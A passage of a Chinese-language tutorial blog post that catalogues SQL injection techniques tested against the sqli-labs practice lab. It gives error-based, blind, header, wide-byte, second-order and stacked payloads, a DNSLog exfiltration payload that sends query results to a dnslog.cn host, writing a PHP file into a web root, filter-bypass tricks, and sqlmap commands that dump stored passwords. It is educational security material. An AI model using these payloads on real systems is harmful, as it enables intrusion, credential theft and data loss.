/xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><p>注意：extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</p><p>extractvalue() 函数不支持低版本 mysql</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(payload),0x7e))</span><br></pre></td></tr></table></figure><p><strong>3.updatexml()函数</strong></p><p>updatexml(目标xml文档，xml路径，更新的内容)：对xml文档进行更新的函数</p><p>updatexml和上面的extractvlaue函数基本上相差不大，用法也相同</p><p>注：高版本的mysql已经修复了该bug</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(payload),0x7e),1)</span><br></pre></td></tr></table></figure><h1 id="GET-布尔盲注"><a href="#GET-布尔盲注" class="headerlink" title="GET 布尔盲注"></a>GET 布尔盲注</h1><p>在没有报错信息时，根据页面回显情况不同考虑布尔盲注</p><h2 id="手动测试-1"><a href="#手动测试-1" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>1.检测是否存在注入点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1     #页面正常显示</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203312421.png" alt="image-20201130203312421"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39;    #无报错信息，但不返回&quot;You are in......&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203507136.png" alt="image-20201130203507136"></p><p><strong>2.判断当前数据库的长度</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database()) &gt; 5--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130204339111.png" alt="image-20201130204339111"></p><p><strong>length(str)</strong>      返回字符串长度</p><p>页面显示正常，说明库名长度大于5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database()) &gt; 10--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130204918453.png" alt="image-20201130204918453"></p><p>继续判断库名长度，此页面表示其小于10</p><p>缩小范围判断，得出当前库名长度为8</p><p><strong>3.判断当前数据库的第一个字符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),1,1)) &#x3D; 115--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130205353557.png" alt="image-20201130205353557"></p><p><strong>ASCII(s)</strong>      返回字符串 s 的第一个字符的 ASCII 码</p><p><strong>SUBSTR(s, n, len)</strong>      从字符串 s 的 n 位置截取长度为 len 的子字符串</p><p>页面显示正常，说明当前数据库的第一个字符的ascii码是115，对应s</p><p>…….更改位置，逐步得出库名security</p><p>……以此类推，得出其他数据</p><h2 id="利用burpsuite测试"><a href="#利用burpsuite测试" class="headerlink" title="利用burpsuite测试"></a><strong>利用burpsuite测试</strong></h2><p>对上面第三步进行抓包，使用intruder模块</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209162311335.png" alt="image-20201209162311335"></p><p>设置payloads</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209162508699.png" alt="image-20201209162508699"></p><p>start attack</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209163040562.png" alt="image-20201209163040562"></p><h1 id="GET-时间盲注"><a href="#GET-时间盲注" class="headerlink" title="GET 时间盲注"></a>GET 时间盲注</h1><p>当页面回显内容完全一致，考虑时间盲注</p><h2 id="手动测试-2"><a href="#手动测试-2" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>1.检测是否存在注入点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(1&#x3D;0,1,sleep(10))--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129174459638.png" alt="image-20201129174459638"></p><p><strong>if（expression,a,b）</strong>  expression条件为真返回a,条件为假返回b</p><p>F12查看network信息，可以看到延迟了10秒，证明存在注入点</p><p><strong>2.判断当前数据库的长度</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(10),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129175046395.png" alt="image-20201129175046395"></p><p>延迟10秒，说明判断成功，当前数据库长度为8</p><p><strong>3.判断当前数据库的第一个字符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(10),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129175759624.png" alt="image-20201129175759624"></p><p>延迟10秒，说明当前数据库的第一个字符的ascii码是115，对应s</p><p>…….更改位置，逐步得出库名security</p><p>……以此类推，得出其他数据</p><h2 id="Sqlmap下测试"><a href="#Sqlmap下测试" class="headerlink" title="Sqlmap下测试"></a><strong>Sqlmap下测试</strong></h2><p>查询库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&quot; --technique B --dbs --batch   #布尔型盲注</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&quot; --technique T --dbs --batch   #时间盲注</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 1071&#x3D;1071 AND &#39;MFtC&#39;&#x3D;&#39;MFtC</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 5530 FROM (SELECT(SLEEP(5)))VtGF) AND &#39;VpPN&#39;&#x3D;&#39;VpPN</span><br></pre></td></tr></table></figure><p>后续步骤与上述Sqlmap测试方法一致</p><p>……</p><h1 id="POST-报错注入"><a href="#POST-报错注入" class="headerlink" title="POST 报错注入"></a>POST 报错注入</h1><h2 id="手动测试-3"><a href="#手动测试-3" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>通过SQL的or运算符，构造万能密码，判断是否为注入点</strong></p><p>判断注入点（添加单引号后报错）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203161208957.png" alt="image-20201203161208957"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; or 1&#x3D;1--+&amp;passwd&#x3D;123456 构造万能密码</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230449498.png" alt="image-20201202230449498"></p><p>判断出注入点之后，就可以利用报错注入,布尔盲注，时间盲注等，获得我们想要的相关信息</p><p>如利用报错注入获取当前数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; or extractvalue(1,concat(0x7e,(database()),0x7e))--+&amp;passwd&#x3D;123456</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230243117.png" alt="image-20201202230243117"></p><p>……</p><h2 id="利用burp-suite测试"><a href="#利用burp-suite测试" class="headerlink" title="利用burp suite测试"></a><strong>利用burp suite测试</strong></h2><p><strong>使用Proxy功能抓包</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230900185.png" alt="image-20201202230900185"></p><p><strong>使用Repeater功能</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202231127632.png" alt="image-20201202231127632"></p><p><strong>构造万能密码</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202231557574.png" alt="image-20201202231557574"></p><h2 id="利用Sqlmap测试-1"><a href="#利用Sqlmap测试-1" class="headerlink" title="利用Sqlmap测试"></a>利用Sqlmap测试</h2><p>复制Burpsuite截断的HTTP请求数据包到文本文件中，使用<strong>Sqlmap -r 文件路径 -p 指定探测参数</strong></p><p>这里复制数据包至sqlmap目录下的target.txt文件</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203000201440.png" alt="image-20201203000201440"></p><p>在Sqlmap中指定探测技术使用–technique  BEUSTQ</p><p><strong>–technique E</strong> 基于报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt -p passwd --technique E</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203000800804.png" alt="image-20201203000800804"></p><p><strong>payload：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: passwd (POST)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: uname&#x3D;admin&amp;passwd&#x3D;123456&#39; AND GTID_SUBSET(CONCAT(0x716a766b71,(SELECT (ELT(7356&#x3D;7356,1))),0x7176706a71),7356)-- lpbw&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>其后添加参数以获取其他信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt -p passwd --technique E --dbs</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E --current-db --current-user --banner</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security --tables</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security -T users --columns</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure><h1 id="POST-布尔、时间盲注"><a href="#POST-布尔、时间盲注" class="headerlink" title="POST 布尔、时间盲注"></a>POST 布尔、时间盲注</h1><p>在admin后添加单引号等字符后并无报错信息，考虑盲注</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203162418352.png" alt="image-20201203162418352"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;or (payload)--+&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;&#39;&#x3D;(payload)&#x3D;&#39; &#39;--+&amp;passwd&#x3D;</span><br><span class="line">&#x2F;&#x2F;如 uname&#x3D;&#39;or (length(database())&#x3D;8)--+&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;&#39;&#x3D;(ascii(substr(database(),1,1))&#x3D;115)&#x3D;&#39; &#39;--+&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201210213730100.png" alt="image-20201210213730100"></p><p><strong>利用burpsuite抓取数据包</strong>，在存在注入点POST提交的参数后加入判断语句，根据Response的结果获取信息</p><p>如下图，判断当前数据库长度是否大于5</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203164042900.png" alt="image-20201203164042900"></p><p>再判断其长度是否大于10</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203164228389.png" alt="image-20201203164228389"></p><p>最后判断其长度为8，以此类推，判断其他信息……</p><p>同样，也可以进行基于时间的盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;or (if(ascii(substr(database(),1,1))&#x3D;115,sleep(5),1))--+&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure><p>在存在注入点POST提交的参数后添加判断语句，根据响应时间获取信息</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203170636591.png" alt="image-20201203170636591"></p><p>继续判断</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203170851871.png" alt="image-20201203170851871"></p><p>最后判断其长度为8，以此类推，判断其他信息……</p><p><strong>利用Sqlmap测试</strong></p><p>同样，这里复制数据包至target.txt,探测技术为–technique B/T</p><h1 id="DNSLog注入"><a href="#DNSLog注入" class="headerlink" title="DNSLog注入"></a>DNSLog注入</h1><p>利用场景：</p><p>不管是布尔类型盲注还是时间盲注，都需要发送大量的数据包去判断数据，而这很可能会触发WAF的防护，因此导致被封IP。所以，如果条件允许，我们可以结合DNSlog来快速的回显数据。MySQL数据库，通过DNSlog盲注需要用到 load_file() 函数，该函数不仅能加载本地文件，同时也能对URL发起请求。因为需要使用 load_file() 函数，所以需要root权限，并且 secure_file_priv 需要为空。</p><p>原理：</p><p>我们输入域名之后 ，需要向DNS服务器查询对应的IP地址，DNS服务器在解析的时候会留下记录，产生日志，我们可以通过查看日志来获取相应信息</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213182240957.png" alt="image-20201213182240957"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前用户名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.5srmkc.dnslog.cn&#x2F;abc&#39;))) --+</span><br><span class="line"></span><br><span class="line"># 查看当前数据库名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.5srmkc.dnslog.cn&#x2F;abc&#39;))) --+</span><br></pre></td></tr></table></figure><p>相关网站：<a href="http://www.dnslog.cn/">www.dnslog.cn</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213183240282.png" alt="image-20201213183240282"></p><p>相关网站：<a href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213192730846.png" alt="image-20201213192730846"></p><h1 id="HTTP头中的SQL注入"><a href="#HTTP头中的SQL注入" class="headerlink" title="HTTP头中的SQL注入"></a>HTTP头中的SQL注入</h1><p>用户提交的参数会被代码中的某些措施进行过滤，但对于HTTP头中提交的内容很有可能就没有进行过滤，如HTTP头中User-Agent、Referer、Cookies等。</p><p><strong>1.HTTP User-Agent 注入</strong></p><p>判断注入点</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201206223156670.png" alt="image-20201206223156670"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(payload),0x7e)) or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201206222552051.png" alt="image-20201206222552051"></p><p><strong>2.HTTP Referer 注入</strong></p><p>注入点在Referer位置</p><p><strong>3.Cookie注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201207155137874.png" alt="image-20201207155137874"></p><p><strong>Sqlmap测试</strong></p><p>在注入点位置处添加*</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201207160206033.png" alt="image-20201207160206033"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt --level 3 --batch</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: Cookie #1* ((custom) HEADER)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND 6901&#x3D;6901-- FpnT</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND GTID_SUBSET(CONCAT(0x71627a7071,(SELECT (ELT(9508&#x3D;9508,1))),0x71766a7871),9508)-- kWcz</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND (SELECT 6663 FROM (SELECT(SLEEP(5)))sHMZ)-- iCIs</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: uname&#x3D;-8722&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7071,0x4f414141466c504c686648564856454869665a68614a4b564d6c4775556f6d6d79464e446f6f7078,0x71766a7871)-- -</span><br></pre></td></tr></table></figure><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>原理：</p><p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 <code>%df\’</code> =<code>%df%5c%27</code>，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 <code>%df%5c</code> 是一个宽字符，也就是<code>縗</code>，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213151446003.png" alt="image-20201213151446003"></p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-33&#x2F;index.php?id&#x3D;%df&#39; union select 1,group_concat(username,0x7e,password),3 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201210204415465.png" alt="image-20201210204415465"></p><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>原理：</p><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p>示例：</p><p>在sqlilabs，Less-24中注册用户名为admin’#密码为123的账号</p><p>登录用户名 admi’# 并修改密码为123456，结果是用户名为admin的密码被修改了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br><span class="line">这是上面的数据库更新语句，在用户名为 &quot;admin&#39;#&quot; 时执行的实际是：</span><br><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br></pre></td></tr></table></figure><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>原理：</p><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p><p>局限性：</p><p>堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，在我们的 web 系统中， 因为代码通常只返回一个查询结果， 因此， 堆叠注入第二个语句产生错误或者结果只能被忽略， 我们在前端界面是无法看到返回结果的。因此， 在读取数据时，建议使用union（联合） 注入。 同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的， 例如表<br>名， 列名等信息</p><p>PS：oracle 不能使用堆叠注入， 当有两条语句在同一行时， 直接报错。 无效字符</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-38&#x2F;index.php ?id&#x3D;1%27;insert into users(id,username,password) values (&#39;39&#39;,&#39;less39&#39;,&#39;hello&#39;)--+</span><br></pre></td></tr></table></figure><h1 id="Mysql注入读写文件"><a href="#Mysql注入读写文件" class="headerlink" title="Mysql注入读写文件"></a>Mysql注入读写文件</h1><p>1.读文件（<a href="http://www.cnblogs.com/lcamry/p/5729087.html">MySQL注入load_file常用路径</a>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php&#x2F;?id&#x3D;-1&#39; union select 1,2,load_file(&#39;D:\\1.txt&#39;)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130215923264.png" alt="image-20201130215923264"></p><p>2.写文件（写webshell到网站目录）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;-1&#39;)) union select 1,&#39;&lt;?php phpinfo(); ?&gt;&#39;,3 into outfile &#39;E:\\web\\apache\\htdocs\\1.php&#39;--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130222727784.png" alt="image-20201130222727784"></p><p><strong>利用Sqlmap读写文件</strong></p><p>–file-read “路径”</p><p>–file-write “要写入的内容或所在文件路径” –file-dest “要写入的路径”</p><p>1.读文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;1&quot; --file-read &quot;D:\\1.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130224238087.png" alt="image-20201130224238087"></p><p>2.写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;1&quot; --file-write &quot;E:\\1.txt&quot; --file-dest &quot;E:\\2.txt&quot;</span><br></pre></td></tr></table></figure><h1 id="SQL注入绕过手段"><a href="#SQL注入绕过手段" class="headerlink" title="SQL注入绕过手段"></a>SQL注入绕过手段</h1><p><strong>1.大小写绕过</strong></p><p>例如：如果过滤了order，可以使用OrdER来进行绕过</p><p><strong>2.双写绕过</strong></p><p>例如：如果过滤了union，发现union无论大小写都会被替换为空，可以使用UniunionOn</p><p><strong>3.编码绕过</strong></p><p>可以利用URL编码，绕过过滤机制</p><p>如，union%250cselect </p><p><strong>4.内联注释绕过</strong></p><p>内联注释里的内容会被当成SQL语句执行，例如/*!select */</p><p><strong>5.绕过去除注释符的SQL注入</strong></p><p>–+，– ，# ，等注释符被过滤失效，考虑其他方式，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.77.1&#x2F;sqlilabs&#x2F;Less-23&#x2F;index.php&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;3</span><br><span class="line">http:&#x2F;&#x2F;192.168.77.1&#x2F;sqlilabs&#x2F;Less-23&#x2F;index.php&#x2F;?id&#x3D;1&#39; or (extractvalue(1,concat(0x7e,(payload)))) or &#39;</span><br></pre></td></tr></table></figure><p><strong>6.绕过过滤and和or的SQL注入</strong></p><p>大小写变形，Or，oR，And，aND等</p><p>添加注释，a/**/nd</p><p>双写绕过，oorr</p><p>利用符号替代，and–&amp;&amp;,or–||</p><p><strong>7.绕过空格过滤</strong></p><p>可使用以下代替空格</p><p>%09  TAB 键（水平）</p><p>%0b  TAB 键（垂直）</p><p>%0a  新建一行</p><p>%0c  新的一页</p><p>%0d  return 功能</p><p>%a0  空格</p><p>/* xxx*/  代替空格(利用fuzz得出xxx)</p><p>或语句间用括号，如 select(1)from(admin)where(length(passwd))=32</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>[1] <a href="https://blog.csdn.net/DarkHQ/article/details/79274376">mysql盲注（基于时间）</a></p><p>[2] <a href="https://www.cnblogs.com/csyxf/p/10241456.html">Mysql报错型注入总结</a></p><p>[3] <a href="https://blog.csdn.net/weixin_45146120/article/details/100186266?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control">MYSQL POST型注入详解</a></p><p>[4] <a 